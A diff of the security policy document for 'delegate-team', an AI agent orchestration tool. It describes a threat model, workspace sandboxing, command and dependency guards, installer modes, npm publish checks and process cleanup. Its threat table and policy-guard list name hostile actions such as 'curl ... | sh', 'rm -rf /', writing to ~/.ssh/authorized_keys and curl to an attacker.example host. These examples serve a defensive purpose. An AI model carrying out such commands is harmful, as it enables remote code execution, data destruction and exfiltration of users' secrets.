@@ -14,43 +14,43 @@ For installation-level safety (dry-run, no-network, trust modes), see
 
 `delegate-team` is an AI agent orchestration tool. It executes code and
 terminal commands on the local machine under your user account. The threats we
-care about (mapped to OWASP LLM Top 10):
+care about include:
 
 | Risk | Example |
 |---|---|
-| LLM01 — Prompt injection via skills | A malicious `SKILL.md` injecting system instructions |
-| LLM04 — Secrets management | API keys leaked in logs or stderr |
-| LLM05 — Supply chain | `npm install <untrusted>` or `curl ... | sh` |
-| LLM07 — Insecure plugin design | MCP server with arbitrary code execution |
-| LLM08 — Excessive agency | Agent `rm -rf /` because the prompt asked for "cleanup" |
+| Prompt injection via skills | A malicious `SKILL.md` injecting instructions |
+| Secrets management | API keys leaked in logs or stderr |
+| Supply chain | `npm install <untrusted>` or `curl ... | sh` |
+| Insecure plugin design | MCP server with arbitrary code execution |
+| Excessive agency | Agent `rm -rf /` because the prompt asked for cleanup |
 
 Plus operational risks specific to multi-agent and orchestrator systems:
 
 | Risk | Example |
 |---|---|
-| Subprocess runaway | MMAS spawning 50 agents and exhausting the host |
+| Subprocess runaway | MMAS spawning too many agents and exhausting the host |
 | Filesystem escape | Agent writing to `~/.ssh/authorized_keys` |
 | Network exfiltration | Agent `curl https://attacker.example` after a prompt |
-| Lifecycle leak | Watchdog leaving zombie subprocesses |
+| Lifecycle leak | Watchdog or child subprocesses left running after stop |
+| Release drift | npm package published with missing runtime files or stale manifests |
 
 ---
 
 ## Built-in guards
 
-### 1. Workspace sandboxing (mitigates LLM08)
+### 1. Workspace sandboxing
 
 The `vertex-coder` agent tools (`read_file`, `write_file`, `list_dir`,
-`grep_search`, `line_replace`) are bound to `DT_WORKSPACE_ROOT` (or the
-current working directory). Access to sensitive paths — `.env`, `~/.ssh`,
-`~/.config` — is blocked unless explicitly overridden.
+`grep_search`, `line_replace`) are bound to `DT_WORKSPACE_ROOT` or the current
+working directory. Access to sensitive paths such as `.env`, `~/.ssh`, and
+`~/.config` is blocked unless explicitly overridden.
 
 Override (dangerous): `DT_WORKSPACE_ESCAPE=1`.
 
-### 2. Command allowlist (mitigates OS command injection + LLM08)
+### 2. Command allowlist
 
-The `run_command` tool enforces a strict allowlist of safe commands
-(`npm test`, `git status`, etc.). Destructive operations (`rm -rf /`,
-unlisted binaries) require:
+The `run_command` tool enforces a strict allowlist of safe commands. Destructive
+operations require:
 
 ```bash
 export DT_ALLOW_UNSAFE_COMMANDS=true
@@ -58,7 +58,7 @@ export DT_ALLOW_UNSAFE_COMMANDS=true
 
 The model cannot set this itself. A human must export it.
 
-### 3. Supply chain guard (mitigates LLM05)
+### 3. Supply chain guard
 
 The `add_dependency` tool blocks:
 
@@ -73,7 +73,7 @@ Installing any package requires:
 export DT_ALLOW_DEP_INSTALL=true
 ```
 
-### 4. Untrusted skills (mitigates LLM01)
+### 4. Untrusted skills
 
 Global skills (`SKILL.md`) loaded from external directories are treated as
 untrusted. They cannot inject system instructions or appear in the agent's
@@ -82,17 +82,18 @@ context without one of:
 - An entry in the explicit allowlist.
 - The `DT_APPROVE_UNTRUSTED=true` environment variable.
 
-### 5. Proxy hardening (mitigates LLM04)
+### 5. Proxy hardening
 
 The local LLM gateway (`dt serve`):
 
 - Binds to `127.0.0.1` only.
-- Requires a proxy token (auto-generated on first run).
+- Requires a proxy token.
+- Uses constant-time comparison for equal-length proxy tokens.
 - Strict CORS allowing only explicit localhost UI ports.
-- 2 MB request body size limit (configurable via `DT_PROXY_MAX_BODY`).
+- 2 MB request body size limit by default, configurable via `DT_PROXY_MAX_BODY`.
 - Automatic log redaction for API keys and Bearer tokens.
 
-### 6. MCP process security (mitigates LLM07)
+### 6. MCP process security
 
 By default, `dt` does **not** auto-load MCP servers from `mcp_config.json`.
 This blocks a malicious config file from triggering arbitrary remote code
@@ -106,15 +107,16 @@ export DT_ENABLE_MCP=true
 
 ### 7. Dynamic authentication
 
-`dt` avoids hardcoded keys in `.env` files. It uses dynamic CLI auth
-(`gcloud auth print-access-token`) and caches config at
-`~/.config/dt/config.json` with `0600` permissions.
+`dt` avoids hardcoded keys in committed files. It uses dynamic CLI auth and
+caches local config at `~/.config/dt/config.json` with `0600` permissions.
+MetaGPT adapter config is written to `~/.metagpt/config2.yaml` with `0600`.
+Containing directories are set to `0700`.
 
 ---
 
-## Installer-level safety (added in v2.6.0)
+## Installer-level safety
 
-The bootstrap script (`install.sh`) now supports safety modes:
+The bootstrap script (`install.sh`) supports safety modes:
 
 | Flag | What it does |
 |---|---|
@@ -125,8 +127,7 @@ The bootstrap script (`install.sh`) now supports safety modes:
 | `--trust-mode dev` | Allows local development shortcuts; prints warnings |
 | `--yes` | Non-interactive approval for CI |
 
-See [INSTALLATION.md](./INSTALLATION.md#lane-3--full-local-agent-os) for
-usage.
+See [INSTALLATION.md](./INSTALLATION.md#lane-3--full-local-agent-os) for usage.
 
 ### What the installer touches
 
@@ -139,8 +140,42 @@ On a Lane 3 install (`./install.sh --all`), the installer may:
 - Run `npx skills add <third-party>` for companion frameworks
 - Run `npm install -g` for unslop-preflight
 
-`--no-network` blocks the last two. `--dry-run` shows all of them without
-doing them.
+`--no-network` blocks the last two. `--dry-run` shows all of them without doing
+them.
+
+---
+
+## npm publish safety
+
+The npm publish workflow is intentionally stricter than a normal release job.
+Before publishing it runs:
+
+```bash
+npm ci
+npm run version:check
+npm run typecheck
+npm run build
+npm test
+npm audit --omit=dev --audit-level=high
+npm pack
+```
+
+It also:
+
+- Warns when `package-lock.json` version metadata is stale and prints the exact
+  fix: `npm install --package-lock-only`.
+- Blocks publish if the git tag does not match `package.json.version`.
+- Skips publish if the exact version already exists on npm.
+- Validates required runtime files inside the npm tarball.
+- Blocks secret-like files such as `.env`, `.npmrc`, private keys, `.pem`, and
+  `.key` from entering the package.
+- Installs the packed artifact into a temporary project and verifies `dt` plus
+  runtime scripts before publish.
+- Publishes with provenance.
+- Verifies the npm registry and `npx <package>@<version>` after publish.
+
+Trusted Publishing with npm OIDC is preferred. `NPM_TOKEN` should only be kept as
+a fallback until npm-side Trusted Publisher settings are configured.
 
 ---
 
@@ -153,26 +188,33 @@ for full details. Highlights:
 |---|---|---|
 | Max agents | 4 | `--max-agents <N>` (hard cap 8) |
 | Per-agent timeout | 900 s | `--timeout <seconds>` |
-| Write mode | `workspace` | `--no-write`, `--logs-only` |
+| Write mode | `workspace` | `--no-write`, `--write-mode none`, `--write-mode logs-only` |
 | Watchdog interval | 30 s | `--interval <seconds>` |
+| Kill grace | 5 s | `--kill-grace <seconds>` (hard cap 30) |
 | Kill switch | manual | `spawn-team.py stop <task_id>` |
 
-A task that times out is `SIGTERM`'d, then `SIGKILL`'d after a 5-second grace
-period. The watchdog never leaves zombie subprocesses.
+Agents and watchdogs are started with `start_new_session=True`, which creates a
+detached process group. The stop command now terminates process groups with
+`SIGTERM`, waits for the configured grace period, then sends `SIGKILL` if the
+original PID is still alive. This is designed to clean up child processes, not
+only parent PIDs.
+
+Atlas mode also cleans up the Atlas process group if `team_plan.json` is not
+written before `--atlas-timeout`.
 
 ---
 
 ## agent-kernel-level safety
 
-The kernel adds a deterministic policy guard. It runs as a `pre-commit` hook
-and as a Claude `PreToolUse` hook. It blocks:
+The kernel adds a deterministic policy guard. It runs as a `pre-commit` hook and
+as a Claude `PreToolUse` hook. It blocks:
 
 - `rm -rf` outside the workspace.
 - `curl ... | sh`.
 - Force-push to `main` / `master`.
 - Any file containing what looks like a leaked secret (heuristic).
 
-You can add your own rules in `~/.agent-kernel/source/memories/` — see
+You can add your own rules in `~/.agent-kernel/source/memories/`; see
 [AGENT-KERNEL-INTEGRATION.md](./AGENT-KERNEL-INTEGRATION.md).
 
 ---
@@ -190,8 +232,10 @@ GitHub. Do **not** open a public issue for suspected vulnerabilities.
 - We do not auto-load untrusted skills.
 - We do not auto-load MCP servers.
 - We do not auto-install companion frameworks without `--all`.
-- We do not write to `~/.ssh/`, `~/.aws/`, or `~/.config/` unless you
-  explicitly enable workspace escape.
+- We do not write to `~/.ssh/`, `~/.aws/`, or `~/.config/` unless you explicitly
+  enable workspace escape.
+- We do not publish to npm merely because a commit landed. The workflow checks
+  whether the version is new first.
 
 If any of those defaults changes, it will be a major version bump.
 
@@ -215,7 +259,12 @@ If any of those defaults changes, it will be a major version bump.
 # Inspect what the orchestrator would do
 mavis-orchestrate "<task>"
 dt route --explain "<task>"
+dt run "<task>" --dry-run
 
 # Kill a runaway MMAS run
 python3 ~/.mavis/agents/mavis/multi-agent/spawn-team.py stop <task_id>
+
+# Release guard
+npm run version:check
+npm install --package-lock-only
 ```
